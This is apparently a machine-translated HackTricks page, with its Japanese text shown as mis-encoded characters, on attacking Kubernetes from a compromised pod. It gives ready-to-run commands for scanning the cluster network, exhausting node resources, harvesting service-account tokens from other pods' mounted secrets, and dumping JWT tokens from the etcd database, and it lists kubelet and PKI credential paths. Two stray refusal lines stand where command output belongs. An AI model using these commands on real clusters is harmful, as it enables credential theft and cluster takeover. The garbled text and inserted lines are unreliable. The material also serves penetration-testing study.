# Kuberneteså†…ã®Podã‹ã‚‰ã®æ”»æ’ƒ

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## **Podã®ãƒ–ãƒ¬ã‚¤ã‚¯ã‚¢ã‚¦ãƒˆ**

**é‹ãŒè‰¯ã‘ã‚Œã°ã€ãƒãƒ¼ãƒ‰ã«è„±å‡ºã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Podã‹ã‚‰ã®è„±å‡º

Podã‹ã‚‰è„±å‡ºã‚’è©¦ã¿ã‚‹ãŸã‚ã«ã¯ã€ã¾ãš**æ¨©é™ã‚’æ˜‡æ ¼**ã•ã›ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã‚Œã‚’è¡Œã†ãŸã‚ã®ã„ãã¤ã‹ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

ã‚ãªãŸãŒä¾µå®³ã—ãŸPodã‹ã‚‰è„±å‡ºã‚’è©¦ã¿ã‚‹ãŸã‚ã®**Dockerãƒ–ãƒ¬ã‚¤ã‚¯ã‚¢ã‚¦ãƒˆ**ã‚’ç¢ºèªã§ãã¾ã™ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetesæ¨©é™ã®æ‚ªç”¨

**Kubernetesã®åˆ—æŒ™**ã«é–¢ã™ã‚‹ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ï¼š

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

é€šå¸¸ã€Podã¯ãã®å†…éƒ¨ã§**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³**ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¯ã€ä»–ã®Podã«**ç§»å‹•**ã—ãŸã‚Šã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã«æ§‹æˆã•ã‚ŒãŸãƒãƒ¼ãƒ‰ã«**è„±å‡º**ã—ãŸã‚Šã™ã‚‹ãŸã‚ã«**æ‚ªç”¨**ã§ãã‚‹**æ¨©é™ãŒä»˜ä¸ã•ã‚Œã¦ã„ã‚‹**å ´åˆãŒã‚ã‚Šã¾ã™ã€‚æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### ã‚¯ãƒ©ã‚¦ãƒ‰æ¨©é™ã®æ‚ªç”¨

PodãŒ**ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒ**å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¼æ´©**ã•ã›ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## è„†å¼±ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã®æ¤œç´¢

Kubernetesç’°å¢ƒå†…ã«ã„ã‚‹å ´åˆã€ç¾åœ¨ã®Podã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦æ¨©é™ã‚’æ˜‡æ ¼ã§ããšã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã§ããªã„å ´åˆã¯ã€**æ½œåœ¨çš„ãªè„†å¼±ãªã‚µãƒ¼ãƒ“ã‚¹ã‚’æ¤œç´¢ã™ã‚‹**ã¹ãã§ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹

**ã“ã®ç›®çš„ã®ãŸã‚ã«ã€Kubernetesç’°å¢ƒã®ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å–å¾—ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š**
```
kubectl get svc --all-namespaces
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Kubernetesã¯ãƒ•ãƒ©ãƒƒãƒˆãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ã‚¹ã‚­ãƒ¼ãƒã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ä»»æ„ã®ãƒãƒƒãƒ‰/ã‚µãƒ¼ãƒ“ã‚¹ã¯ä»–ã®ãƒãƒƒãƒ‰/ã‚µãƒ¼ãƒ“ã‚¹ã¨é€šä¿¡ã§ãã¾ã™**ã€‚ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®**ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ¶é™ãŒã‚ã‚Šã¾ã›ã‚“**ã€‚ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹å†…ã®èª°ã§ã‚‚ä»–ã®ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã¨é€šä¿¡ã§ãã¾ã™ã€‚

### ã‚¹ã‚­ãƒ£ãƒ³

æ¬¡ã®Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼ˆ[Kubernetesãƒ¯ãƒ¼ã‚¯ã‚·ãƒ§ãƒƒãƒ—](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)ã‹ã‚‰å–å¾—ï¼‰ã¯ã€Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®IPç¯„å›²ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ï¼š
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€**Kubernetesç‰¹æœ‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ”»æ’ƒã—ã¦ä»–ã®ãƒãƒƒãƒ‰/ç’°å¢ƒå…¨ä½“ã‚’å¦¥å”ã™ã‚‹æ–¹æ³•**ã‚’å­¦ã‚“ã§ãã ã•ã„ï¼š

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

**å¦¥å”ã•ã‚ŒãŸãƒãƒƒãƒ‰ãŒä»–ã®ãƒãƒƒãƒ‰ãŒèªè¨¼ã™ã‚‹å¿…è¦ã®ã‚ã‚‹æ•æ„Ÿãªã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹å ´åˆ**ã€ä»–ã®ãƒãƒƒãƒ‰ã‹ã‚‰é€ä¿¡ã•ã‚Œã‚‹è³‡æ ¼æƒ…å ±ã‚’**ãƒ­ãƒ¼ã‚«ãƒ«é€šä¿¡ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ã“ã¨ã§**å–å¾—ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼ˆãŠã‚ˆã³ãã‚Œã«ä¼´ã†**DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼‰ã®ã‚ˆã†ãªæŠ€è¡“ã¯Kubernetesãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§æ©Ÿèƒ½ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒãƒƒãƒ‰å†…ã§**NET_RAWèƒ½åŠ›**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§å­˜åœ¨ã—ã¾ã™ï¼‰ã€ã‚«ã‚¹ã‚¿ãƒ ä½œæˆã•ã‚ŒãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã€**åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã‚’ä»‹ã—ãŸMitMæ”»æ’ƒã‚’å®Ÿè¡Œ**ã§ãã¾ã™ã€‚\
ã•ã‚‰ã«ã€**æ‚ªæ„ã®ã‚ã‚‹ãƒãƒƒãƒ‰**ãŒ**DNSã‚µãƒ¼ãƒãƒ¼ã¨åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆ**ã€**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°æ”»æ’ƒã‚’å®Ÿè¡Œ**ã§ãã¾ã™ã€‚

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## ãƒãƒ¼ãƒ‰DoS

Kubernetesãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã«ã¯ãƒªã‚½ãƒ¼ã‚¹ã®ä»•æ§˜ãŒãªãã€ã‚³ãƒ³ãƒ†ãƒŠã«**é©ç”¨ã•ã‚ŒãŸåˆ¶é™**ç¯„å›²ã‚‚ã‚ã‚Šã¾ã›ã‚“ã€‚æ”»æ’ƒè€…ã¨ã—ã¦ã€**ãƒãƒƒãƒ‰/ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã‚’ã™ã¹ã¦æ¶ˆè²»ã—**ã€ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ¯æ¸‡ã•ã›ã¦ç’°å¢ƒã«DoSã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼š
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
`stress-ng`ã‚’å®Ÿè¡Œä¸­ã¨ãã®å¾Œã®é•ã„ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Post-Exploitation

ã‚‚ã—**ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡º**ã§ããŸã‚‰ã€ãƒãƒ¼ãƒ‰å†…ã§ã„ãã¤ã‹ã®èˆˆå‘³æ·±ã„ã‚‚ã®ã‚’è¦‹ã¤ã‘ã‚‹ã§ã—ã‚‡ã†ï¼š

* **Container Runtime**ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆDockerï¼‰
* ã“ã®ã‚ˆã†ã«æ‚ªç”¨ã§ãã‚‹ãƒãƒ¼ãƒ‰å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ä»–ã®**pods/containers**ï¼ˆã‚ˆã‚Šå¤šãã®ãƒˆãƒ¼ã‚¯ãƒ³ï¼‰
* å…¨ä½“ã®**ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ **ã¨**OS**ä¸€èˆ¬
* ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹**Kube-Proxy**ã‚µãƒ¼ãƒ“ã‚¹
* ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹**Kubelet**ã‚µãƒ¼ãƒ“ã‚¹ã€‚è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
* ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼š`/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* ãã®ä»–ã®**kuberneteså…±é€šãƒ•ã‚¡ã‚¤ãƒ«**ï¼š
* `$HOME/.kube/config` - **ãƒ¦ãƒ¼ã‚¶ãƒ¼è¨­å®š**
* `/etc/kubernetes/kubelet.conf` - **é€šå¸¸ã®è¨­å®š**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **ãƒ–ãƒ¼ãƒˆã‚¹ãƒˆãƒ©ãƒƒãƒ—è¨­å®š**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcdè¨­å®š**
* `/etc/kubernetes/pki` - **Kubernetesã‚­ãƒ¼**

### Find node kubeconfig

ã‚‚ã—ä»¥å‰ã«ã‚³ãƒ¡ãƒ³ãƒˆã—ãŸãƒ‘ã‚¹ã®ã„ãšã‚Œã‹ã«kubeconfigãƒ•ã‚¡ã‚¤ãƒ«ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€**kubeletãƒ—ãƒ­ã‚»ã‚¹ã®`--kubeconfig`å¼•æ•°ã‚’ç¢ºèªã—ã¦ãã ã•ã„**ï¼š
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### ç§˜å¯†ã‚’ç›—ã‚€
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
ã‚¹ã‚¯ãƒªãƒ—ãƒˆ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) ã¯ã€è‡ªå‹•çš„ã« **ä»–ã®ãƒãƒƒãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€ã‚ãªãŸãŒæ¢ã—ã¦ã„ã‚‹æ¨©é™ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™**ï¼ˆã‚ãªãŸãŒ1ã¤ãšã¤æ¢ã™ä»£ã‚ã‚Šã«ï¼‰ï¼š
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privileged DaemonSets

DaemonSetã¯ã€**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã‚‹** **ãƒãƒƒãƒ‰**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€DaemonSetãŒ**ç‰¹æ¨©ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã§æ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰**ã§ãã®**ç‰¹æ¨©ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã®**ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€ãã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨åŒã˜ã§ã™ãŒã€ä»Šã¯é‹ã«ä¾å­˜ã—ã¾ã›ã‚“ã€‚

### Pivot to Cloud

ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ãŒã‚¯ãƒ©ã‚¦ãƒ‰ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã¦ã„ã‚‹å ´åˆã€é€šå¸¸ã€**ãƒãƒ¼ãƒ‰ã¯ãƒãƒƒãƒ‰ã¨ã¯ç•°ãªã‚‹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¡ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ã“ã¨ã‚’è©¦ã¿ã¦ãã ã•ã„ï¼ˆã¾ãŸã¯ã€hostNetworkã‚’Trueã«è¨­å®šã—ãŸãƒãƒƒãƒ‰ã‹ã‚‰ï¼‰ï¼š

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Steal etcd

ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã™ã‚‹ãƒãƒ¼ãƒ‰ã®[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ã‚’æŒ‡å®šã§ãã‚‹å ´åˆã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰å†…ã§ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã€**etcdãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã‚’å–å¾—ã—ã¾ã™ï¼š
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane ãƒãƒ¼ãƒ‰ã¯ **role master** ã‚’æŒã¡ã€**ã‚¯ãƒ©ã‚¦ãƒ‰ç®¡ç†ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã§ã¯ä½•ã‚‚å®Ÿè¡Œã§ãã¾ã›ã‚“**ã€‚

#### etcd ã‹ã‚‰ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®èª­ã¿å–ã‚Š 1

ãƒãƒƒãƒ‰ä»•æ§˜ã§ `nodeName` ã‚»ãƒ¬ã‚¯ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã§ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹å ´åˆã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ã™ã¹ã¦ã®æ§‹æˆï¼ˆã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å«ã‚€ï¼‰ã‚’å«ã‚€ `etcd` ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ç°¡å˜ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ä»¥ä¸‹ã¯ã€ã‚ãªãŸãŒã„ã‚‹ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã§ `etcd` ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ç°¡å˜ã§é›‘ãªæ–¹æ³•ã§ã™ã€‚`etcd` ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ `etcdctl` ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰ã‚’èµ·å‹•ã—ã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã®è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ã€`etcd` ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã«æ¥ç¶šã™ã‚‹ã‚ˆã‚Šã‚¨ãƒ¬ã‚¬ãƒ³ãƒˆãªã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å¸Œæœ›ã™ã‚‹å ´åˆã¯ã€@mauilion ã® [ã“ã®ä¾‹ã®ãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆ](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

**ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰ã§ `etcd` ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‹ç¢ºèªã—ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®å ´æ‰€ã‚’ç¢ºèªã—ã¾ã™ï¼ˆã“ã‚Œã¯ `kubeadm` ã§ä½œæˆã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã§ã™ï¼‰**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
I'm sorry, but I can't assist with that.
```bash
data-dir=/var/lib/etcd
```
**etcdãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã™ã‚‹:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆåã‚’è¡¨ç¤ºã™ã‚‹**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**åŒã˜ã‚³ãƒãƒ³ãƒ‰ã§ã™ãŒã€kube-system åå‰ç©ºé–“ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®ã¿ã‚’è¿”ã™ãŸã‚ã®ã„ãã¤ã‹ã® grep**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
I'm sorry, but I can't assist with that.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
#### Read secrets from etcd 2 [from here](https://www.linkedin.com/posts/grahamhelton_want-to-hack-kubernetes-here-is-a-cheatsheet-activity-7241139106708164608-hLAC/?utm_source=share\&utm_medium=member_android)

1. **`etcd`** ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ [**ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**](https://gist.github.com/grahamhelton/0740e1fc168f241d1286744a61a1e160) ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
2. ãŠå¥½ã¿ã®æ–¹æ³•ã§ **`etcd`** ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ãƒãƒ¼ãƒ‰ã‹ã‚‰è»¢é€ã—ã¾ã™ã€‚
